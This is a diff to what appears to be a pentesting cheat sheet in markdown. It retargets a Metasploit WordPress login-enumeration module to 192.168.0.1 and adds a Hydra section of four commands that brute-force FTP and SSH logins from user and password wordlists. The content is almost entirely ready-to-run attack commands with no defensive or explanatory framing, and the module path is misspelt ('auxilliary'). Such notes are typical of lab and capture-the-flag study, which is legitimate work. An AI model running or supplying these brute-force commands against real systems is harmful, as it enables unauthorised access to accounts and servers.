@@ -27,9 +27,14 @@
 > use auxilliary/scanner/http/wordpress_login_enum <br/>
 > show options <br/>
 >	set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt <br/>
->	set RHOSTS 10.10.10.10  (target ip) <br/>
+>	set RHOSTS 192.168.0.1  (target ip) <br/>
 >	set RPORT 8080          (target port) <br/>
->	set TARGETURI http://10.10.10.10:8080/ <br/>
+>	set TARGETURI http://192.168.0.1:8080/ <br/>
 >	set USERNAME admin <br/>
-> 
+
+## HYDRA <br/>
+> hydra -L /home/user.txt -P /home/pass.txt 192.168.0.1 ftp <br/>
+> hydra -L /home/user.txt -P /home/pass.txt ftp://192.168.0.1 <br/>
+> hydra -L /home/user.txt -P /home/pass.txt 192.168.0.1 ssh <br/>
+> hydra -L /home/user.txt -P /home/pass.txt ssh://192.168.0.1 <br/>
  
